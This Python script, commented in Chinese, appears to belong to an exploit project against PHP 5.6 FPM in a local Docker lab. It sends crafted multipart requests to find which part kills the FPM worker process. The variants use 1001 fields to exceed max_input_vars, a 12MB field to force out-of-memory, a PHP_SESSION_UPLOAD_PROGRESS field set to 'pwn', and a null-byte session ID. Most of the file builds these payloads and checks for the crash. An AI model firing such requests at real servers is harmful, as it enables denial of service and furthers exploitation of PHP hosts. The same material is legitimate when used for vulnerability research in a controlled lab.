#!/usr/bin/env python3
"""php56 probe2: 隔离 A 请求的哪个成分杀死 FPM child。

变体：
  a) 1001 字段（max_input_vars 警告）+ upload_progress + 文件 —— 无 OOM 字段
  b) 仅 12MB big 字段 + upload_progress —— 纯 OOM
  c) 完整 A（1001 + big）—— 已知会杀 child，作对照
  d) 1001 字段 + big，但无 upload_progress/文件 —— OOM 不在 session init 内

每个变体前后用 docker top 读 child PID，判断 child 是否被换掉。
"""

from __future__ import annotations

import subprocess
import sys
import os
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from exploit import Target, build_multipart  # noqa: E402

URL = "http://127.0.0.1:8089/index.php"


def child_pid() -> str:
    out = subprocess.run(
        ["docker", "top", "php56-fpm", "-eo", "pid,ppid,comm"],
        capture_output=True, text=True,
    ).stdout.strip().splitlines()[1:]
    # master 是 pid 1（docker top 显示 host pid），child 是 ppid 指向 master 的那个
    pids = {}
    for line in out:
        f = line.split()
        if len(f) >= 3:
            pids[f[0]] = f[1]
    for pid, ppid in pids.items():
        if ppid in pids and pid != "1":
            return pid
    # 兜底：取最后一个非 master 行
    return out[-1].split()[0] if out else "?"


def probe(name: str, parts: list) -> None:
    before = child_pid()
    t = Target(URL, timeout=90.0, verbose=False)
    try:
        resp = t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                      read_cap=1 << 20, timeout=90.0)
        status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
    except Exception as e:
        status = f"EXC {e}"
    time.sleep(1.0)
    after = child_pid()
    verdict = "CHILD DIED" if before != after else "child survived"
    print(f"[{name}] pid {before} -> {after}: {verdict}; resp: {status[:60]}")


def main() -> int:
    fields1001 = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    big = {"name": "big", "data": b"B" * (12 * 1024 * 1024)}
    uprog = {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}
    sid = {"name": "PHPSESSID", "data": b"\x00"}
    file = {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    probe("a 1001+uprog+file (no OOM)", fields1001 + [sid, uprog, file])
    probe("b big+uprog (pure OOM in sess)", [sid, uprog, file, big])
    probe("c full A (1001+big) [control]", fields1001 + [sid, uprog, file, big])
    probe("d 1001+big (no session part)", fields1001 + [big])
    return 0


if __name__ == "__main__":
    sys.exit(main())
